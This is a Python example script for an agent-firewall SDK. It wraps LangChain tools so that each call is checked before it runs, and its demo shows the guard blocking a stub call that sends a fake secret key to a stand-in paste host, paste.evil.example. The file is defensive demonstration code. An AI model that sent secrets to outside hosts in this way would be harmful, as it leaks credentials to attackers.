"""
Quesen Agent Firewall as a LangChain tool wrapper.

Drop `quesen_guard` around ANY LangChain tool and every invocation is checked
by Quesen first. A secret-exfiltration call is deterministically blocked
before the underlying tool runs.

    pip install quesen-sdk langchain-core
    export QUESEN_BASE_URL=... QUESEN_API_KEY=...
    python examples/langchain_firewall.py

This file degrades gracefully: if langchain-core is not installed it prints
install instructions instead of crashing.
"""
from __future__ import annotations

import os
import sys

from quesen_sdk import QuesenClient
from quesen_sdk.tsc import TscBlocked, TscContext


def quesen_guard(tool, client: QuesenClient, *, data_classes_arg: str = "data_classes",
                 url_arg: str = "url"):
    """Return a wrapped callable that checks Quesen before running `tool`.

    Framework-agnostic core; the LangChain glue below just adapts it.
    """
    def _run(**kwargs):
        url = kwargs.get(url_arg, "")
        data_classes = kwargs.get(data_classes_arg, ["unknown"])
        decision = client.validate_tsc(
            TscContext.data_egress(
                data_classes=data_classes, to=url,
                destination_trust="unverified", framework="langchain",
            )
        )
        if not decision.allowed:
            raise TscBlocked(decision)
        return tool(**kwargs)
    return _run


def main() -> int:
    try:
        from langchain_core.tools import tool as lc_tool  # noqa: F401
    except Exception:
        print("This example needs langchain-core:  pip install langchain-core")
        print("The core guard in quesen_guard() works without any framework.")
        return 0

    if not os.environ.get("QUESEN_BASE_URL"):
        print("Set QUESEN_BASE_URL (engine QUESEN_TSC_V2_ENABLED=true).")
        return 2

    client = QuesenClient()

    def send_data(url: str, payload: str, data_classes) -> str:
        return f"sent {len(payload)} bytes to {url}"

    guarded = quesen_guard(send_data, client)

    print("[safe]      ", end="")
    try:
        print(guarded(url="https://api.company.com/ok", payload="hi",
                      data_classes=["public"]))
    except TscBlocked as e:
        print(f"blocked: {e}")

    print("[malicious] ", end="")
    try:
        print(guarded(url="https://paste.evil.example", payload="sk-live-x",
                      data_classes=["secret"]))
    except TscBlocked as e:
        print(f"BLOCKED by Quesen: {', '.join(e.decision.reason_codes)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
